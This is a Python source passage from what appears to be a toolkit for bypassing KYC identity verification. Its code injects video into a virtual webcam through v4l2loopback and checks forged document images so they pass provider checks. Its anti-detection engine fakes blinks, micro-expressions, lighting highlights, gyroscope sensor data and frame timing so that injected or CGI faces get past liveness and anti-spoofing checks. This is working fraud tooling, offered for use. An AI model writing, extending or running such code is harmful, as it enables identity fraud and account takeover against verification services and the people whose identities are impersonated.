                    "y_avg": y_avg, "u_avg": u_avg, "v_avg": v_avg,
                    "estimated_temp_k": self._estimate_color_temp(u_avg, v_avg),
                    "brightness": y_avg / 255.0,
                }
        except Exception as e:
            logger.warning(f"[AMBIENT] Frame analysis failed: {e}")

        return {"estimated_temp_k": 5500, "brightness": 0.5}

    def _estimate_color_temp(self, u_avg: float, v_avg: float) -> int:
        """Rough color temperature estimation from YUV chroma channels."""
        # Higher V = warmer (more red), higher U = cooler (more blue)
        warmth_ratio = (v_avg - 128) / max(1, abs(u_avg - 128) + 1)
        if warmth_ratio > 0.5:
            return 2700  # Very warm
        elif warmth_ratio > 0.1:
            return 3500  # Warm
        elif warmth_ratio > -0.1:
            return 5500  # Neutral
        else:
            return 7000  # Cool/blue

    def normalize_frame(self, input_path: str, output_path: str,
                        target_preset: Optional[str] = None) -> bool:
        """
        Apply ambient lighting normalization to a frame/image.
        Uses FFmpeg colorchannelmixer to adjust color temperature.
        """
        if not self._ffmpeg_available:
            logger.warning("[AMBIENT] FFmpeg not available, skipping normalization")
            return False

        preset = self.AMBIENT_PRESETS.get(target_preset, self.preset) if target_preset else self.preset
        warmth = preset["warmth"]
        brightness = preset["brightness_mod"]

        # colorchannelmixer: boost red channel for warmth, reduce blue
        rr = 1.0 + warmth
        bb = 1.0 - warmth * 0.8
        gg = 1.0 - warmth * 0.1

        filter_str = (
            f"colorchannelmixer=rr={rr:.3f}:gg={gg:.3f}:bb={bb:.3f},"
            f"eq=brightness={brightness - 1.0:.3f}:saturation=1.05"
        )

        cmd = [
            "ffmpeg", "-y", "-i", input_path,
            "-vf", filter_str,
            "-frames:v", "1",
            output_path,
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                logger.info(f"[AMBIENT] Normalized: {input_path} → {output_path} (preset={self.preset_name})")
                return True
            else:
                logger.error(f"[AMBIENT] FFmpeg error: {result.stderr[:200]}")
                return False
        except Exception as e:
            logger.error(f"[AMBIENT] Normalization failed: {e}")
            return False

    def get_v4l2_filter_chain(self) -> str:
        """
        Generate FFmpeg filter chain for real-time v4l2loopback webcam feed.
        Used by KYC webcam injection pipeline.
        """
        warmth = self.preset["warmth"]
        brightness = self.preset["brightness_mod"]
        rr = 1.0 + warmth
        bb = 1.0 - warmth * 0.8
        gg = 1.0 - warmth * 0.1

        return (
            f"colorchannelmixer=rr={rr:.3f}:gg={gg:.3f}:bb={bb:.3f},"
            f"eq=brightness={brightness - 1.0:.3f}:saturation=1.05,"
            f"noise=alls=2:allf=t"  # Subtle sensor noise for realism
        )


# ═══════════════════════════════════════════════════════════════════════════
# V7.6 P0 UPGRADE: DOCUMENT QUALITY ANALYZER
# Analyze document quality before injection to avoid detection
# ═══════════════════════════════════════════════════════════════════════════

class DocumentQualityAnalyzer:
    """
    V7.6: Analyzes document image quality before KYC injection.
    
    KYC providers analyze document quality to detect:
    - Screen photo captures (moiré patterns, pixel grid)
    - Printout scans (paper texture, dot patterns)
    - Photo-of-photo attacks (reflection, blur)
    - JPEG compression artifacts from multiple saves
    
    This analyzer identifies issues BEFORE injection.
    """
    
    # Quality thresholds
    THRESHOLDS = {
        'min_resolution': (1000, 600),  # Min width x height
        'max_jpeg_quality_loss': 3,      # Max re-compression cycles
        'min_sharpness': 40.0,           # Laplacian variance threshold
        'max_noise_level': 15.0,         # Peak noise tolerance
        'min_contrast': 0.3,             # Histogram spread requirement
    }
    
    def __init__(self):
        self._has_cv2 = False
        self._has_numpy = False
        try:
            import cv2
            import numpy as np
            self._has_cv2 = True
            self._has_numpy = True
        except ImportError:
            pass
    
    def analyze(self, image_path: str) -> Dict[str, Any]:
        """
        Analyze document image for KYC readiness.
        
        Returns quality report with pass/fail for each metric.
        """
        import os
        
        if not os.path.exists(image_path):
            return {'error': f'Image not found: {image_path}', 'ready': False}
        
        report = {
            'image_path': image_path,
            'ready': True,
            'issues': [],
            'metrics': {},
        }
        
        # Get file size
        file_size = os.path.getsize(image_path)
        report['metrics']['file_size_kb'] = file_size / 1024
        
        if file_size < 50 * 1024:  # < 50KB
            report['issues'].append('File too small - likely low quality')
        
        if self._has_cv2:
            self._analyze_with_cv2(image_path, report)
        else:
            # Basic checks without OpenCV
            self._analyze_basic(image_path, report)
        
        report['ready'] = len(report['issues']) == 0
        return report
    
    def _analyze_with_cv2(self, image_path: str, report: Dict):
        """Full analysis using OpenCV."""
        import cv2
        import numpy as np
        
        img = cv2.imread(image_path)
        if img is None:
            report['issues'].append('Could not read image')
            return
        
        h, w = img.shape[:2]
        report['metrics']['resolution'] = (w, h)
        
        # Resolution check
        min_w, min_h = self.THRESHOLDS['min_resolution']
        if w < min_w or h < min_h:
            report['issues'].append(f'Resolution too low: {w}x{h}, need {min_w}x{min_h}')
        
        # Sharpness (Laplacian variance)
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        laplacian = cv2.Laplacian(gray, cv2.CV_64F)
        sharpness = laplacian.var()
        report['metrics']['sharpness'] = round(sharpness, 2)
        
        if sharpness < self.THRESHOLDS['min_sharpness']:
            report['issues'].append(f'Image too blurry: sharpness={sharpness:.1f}')
        
        # Contrast (histogram analysis)
        hist = cv2.calcHist([gray], [0], None, [256], [0, 256])
        hist_norm = hist / hist.sum()
        non_zero = np.count_nonzero(hist_norm > 0.001)
        contrast = non_zero / 256
        report['metrics']['contrast'] = round(contrast, 2)
        
        if contrast < self.THRESHOLDS['min_contrast']:
            report['issues'].append(f'Low contrast: {contrast:.2f}')
        
        # Noise level estimation
        noise = self._estimate_noise(gray)
        report['metrics']['noise_level'] = round(noise, 2)
        
        if noise > self.THRESHOLDS['max_noise_level']:
            report['issues'].append(f'High noise level: {noise:.1f}')
        
        # Moiré pattern detection (screen capture indicator)
        moire_score = self._detect_moire(gray)
        report['metrics']['moire_score'] = round(moire_score, 2)
        
        if moire_score > 0.5:
            report['issues'].append('Possible moiré pattern (screen capture?)')
    
    def _analyze_basic(self, image_path: str, report: Dict):
        """Basic analysis without OpenCV."""
        # Use PIL if available
        try:
            from PIL import Image
            with Image.open(image_path) as img:
                w, h = img.size
                report['metrics']['resolution'] = (w, h)
                
                min_w, min_h = self.THRESHOLDS['min_resolution']
                if w < min_w or h < min_h:
                    report['issues'].append(f'Resolution too low: {w}x{h}')
        except Exception:
            report['issues'].append('Could not analyze image dimensions')
    
    def _estimate_noise(self, gray_img) -> float:
        """Estimate image noise level using Median Absolute Deviation."""
        import cv2
        import numpy as np
        
        # High-pass filter to isolate noise
        blurred = cv2.GaussianBlur(gray_img, (5, 5), 0)
        noise = cv2.absdiff(gray_img, blurred)
        
        return np.median(noise) * 1.4826
    
    def _detect_moire(self, gray_img) -> float:
        """Detect moiré patterns indicating screen capture."""
        import cv2
        import numpy as np
        
        # FFT to detect regular patterns
        f = np.fft.fft2(gray_img.astype(np.float32))
        fshift = np.fft.fftshift(f)
        magnitude = np.abs(fshift)
        
        # Look for peaks at regular intervals (screen pixel grid)
        h, w = magnitude.shape
        center = (h // 2, w // 2)
        
        # Create annular mask to find periodic peaks
        y, x = np.ogrid[:h, :w]
        r = np.sqrt((x - center[1])**2 + (y - center[0])**2)
        
        # Check mid-frequency range where moiré appears
        ring_mask = (r > 50) & (r < min(h, w) // 4)
        ring_values = magnitude[ring_mask]
        
        # High variance in ring = possible moiré
        if ring_values.std() > 0:
            peak_ratio = ring_values.max() / ring_values.mean()
            return min(peak_ratio / 50, 1.0)  # Normalize to 0-1
        
        return 0.0
    
    def get_enhancement_suggestions(self, report: Dict) -> List[str]:
        """Get suggestions to fix document quality issues."""
        suggestions = []
        
        for issue in report.get('issues', []):
            if 'resolution' in issue.lower():
                suggestions.append('Use higher resolution source image')
            elif 'blur' in issue.lower():
                suggestions.append('Use sharper source or apply unsharp mask')
            elif 'noise' in issue.lower():
                suggestions.append('Apply denoising filter before injection')
            elif 'moire' in issue.lower():
                suggestions.append('Use direct scan, not photo of screen')
            elif 'contrast' in issue.lower():
                suggestions.append('Adjust levels/curves to improve contrast')
        
        return suggestions


# ═══════════════════════════════════════════════════════════════════════════
# V7.6 P0 UPGRADE: KYC ANTI-DETECTION ENGINE
# Counter KYC provider anti-spoofing measures
# ═══════════════════════════════════════════════════════════════════════════

class KYCAntiDetectionEngine:
    """
    V7.6: Counter various KYC anti-spoofing detection methods.
    
    Detection methods and countermeasures:
    1. Screen reflection detection → Add realistic specular highlights
    2. Blink frequency analysis → Natural blink timing with variance
    3. Micro-expression detection → Subtle expression micro-variations
    4. Device orientation consistency → Smooth gyro data injection
    5. Video injection detection → Frame timestamp manipulation
    """
    
    # Natural blink timing distribution (ms between blinks)
    BLINK_INTERVALS = {
        'relaxed': (2500, 6000),   # Reading/relaxed state
        'attentive': (3000, 8000),  # Focused on task
        'stressed': (1500, 3500),   # Under pressure
    }
    
    # Micro-expression amplitude ranges
    MICRO_EXPRESSIONS = {
        'eyebrow_raise': (0.01, 0.03),
        'eye_squint': (0.005, 0.02),
        'lip_tension': (0.01, 0.025),
        'nostril_flare': (0.005, 0.015),
    }
    
    def __init__(self, state: str = 'attentive'):
        import random
        self.state = state
        self._random = random.Random()
        self._last_blink = 0
        self._next_blink = self._generate_next_blink_time()
    
    def _generate_next_blink_time(self) -> int:
        """Generate next blink time with natural variance."""
        interval = self.BLINK_INTERVALS.get(self.state, self.BLINK_INTERVALS['attentive'])
        return self._random.randint(*interval)
    
    def generate_natural_blink_schedule(self, duration_ms: int) -> List[int]:
        """Generate natural blink schedule for video duration."""
        blinks = []
        current_time = self._random.randint(500, 2000)  # Random start
        
        while current_time < duration_ms:
            blinks.append(current_time)
            current_time += self._generate_next_blink_time()
        
        return blinks
    
    def generate_micro_expression_keyframes(self, duration_ms: int, 
                                              fps: int = 30) -> List[Dict]:
        """
        Generate subtle micro-expression variations for realistic face.
        
        These micro-movements make static/CGI faces appear more natural.
        """
        keyframes = []
        frame_interval = 1000 // fps
        num_frames = duration_ms // frame_interval
        
        for i in range(num_frames):
            time_ms = i * frame_interval
            
            # Generate subtle random variations
            frame = {'time_ms': time_ms}
            for expr, (min_val, max_val) in self.MICRO_EXPRESSIONS.items():
                # Perlin-like smooth noise for natural variation
                phase = time_ms / 1000 * self._random.uniform(0.3, 0.7)
                import math
                value = (math.sin(phase) + 1) / 2 * (max_val - min_val) + min_val
                frame[expr] = round(value, 4)
            
            keyframes.append(frame)
        
        return keyframes
    
    def generate_specular_highlights(self, face_bbox: Tuple[int, int, int, int],
                                       light_positions: List[str] = None) -> List[Dict]:
        """
        Generate realistic specular highlights for face.
        
        Makes injected face appear to be in real environment with actual light sources.
        """
        if light_positions is None:
            light_positions = ['top_left', 'ambient']
        
        x, y, w, h = face_bbox
        highlights = []
        
        for pos in light_positions:
            if pos == 'top_left':
                highlights.append({
                    'type': 'specular',
                    'position': (x + int(w * 0.3), y + int(h * 0.15)),
                    'radius': int(min(w, h) * 0.08),
                    'intensity': 0.15,
                    'falloff': 2.0,
                })
            elif pos == 'top_right':
                highlights.append({
                    'type': 'specular',
                    'position': (x + int(w * 0.7), y + int(h * 0.15)),
                    'radius': int(min(w, h) * 0.06),
                    'intensity': 0.10,
                    'falloff': 2.5,
                })
            elif pos == 'ambient':
                # Subtle ambient fill on cheeks
                highlights.append({
                    'type': 'ambient',
                    'position': (x + int(w * 0.25), y + int(h * 0.5)),
                    'radius': int(min(w, h) * 0.15),
                    'intensity': 0.05,
                    'falloff': 1.5,
                })
        
        return highlights
    
    def generate_device_orientation_data(self, duration_ms: int,
                                           device_type: str = 'phone') -> List[Dict]:
        """
        Generate realistic device orientation sensor data.
        
        KYC apps check if device sensors match expected patterns for
        a human holding a phone/tablet.
        """
        import math
        
        data_points = []
        sample_rate = 50  # 50 Hz typical for motion sensors
        num_samples = (duration_ms * sample_rate) // 1000
        
        # Base orientation (portrait mode, slightly tilted)
        base_alpha = 0  # Compass (we keep stable)
        base_beta = 80  # Tilt front/back (holding phone facing user)
        base_gamma = -5  # Tilt left/right (slight right hand tilt)
        
        # Human hand tremor parameters
        tremor_freq = self._random.uniform(8, 12)  # Hz (physiological tremor)
        tremor_amp = self._random.uniform(0.3, 0.8)  # Degrees
        
        for i in range(num_samples):
            time_ms = (i * 1000) // sample_rate
            t = time_ms / 1000  # Time in seconds
            
            # Add physiological tremor
            tremor = tremor_amp * math.sin(2 * math.pi * tremor_freq * t)
            tremor2 = tremor_amp * 0.7 * math.sin(2 * math.pi * tremor_freq * 1.1 * t + 0.5)
            
            # Add slow drift (breathing, shifting grip)
            drift_beta = 2 * math.sin(2 * math.pi * 0.2 * t)  # ~0.2 Hz breathing
            drift_gamma = 1.5 * math.sin(2 * math.pi * 0.15 * t + 1)
            
            data_points.append({
                'time_ms': time_ms,
                'alpha': round(base_alpha + tremor * 0.1, 2),
                'beta': round(base_beta + tremor + drift_beta, 2),
                'gamma': round(base_gamma + tremor2 + drift_gamma, 2),
            })
        
        return data_points
    
    def get_frame_timestamp_jitter(self, frame_number: int, fps: int = 30) -> int:
        """
        Generate realistic frame timestamp jitter.
        
        Perfect frame timing = video injection indicator.
        Real cameras have slight timing variations.
        """
        # Base expected timestamp
        expected_ms = (frame_number * 1000) // fps
        
        # Add realistic jitter (-2ms to +3ms typical for webcams)
        jitter = self._random.gauss(0.5, 1.2)
        jitter = max(-2, min(3, jitter))
        
        return expected_ms + int(jitter)


# V7.6 Convenience exports
def analyze_document_quality(image_path: str) -> Dict:
    """V7.6: Analyze document quality for KYC injection"""
    return DocumentQualityAnalyzer().analyze(image_path)

def create_anti_detection_engine(state: str = 'attentive') -> KYCAntiDetectionEngine:
    """V7.6: Create anti-detection engine for KYC bypass"""
    return KYCAntiDetectionEngine(state)
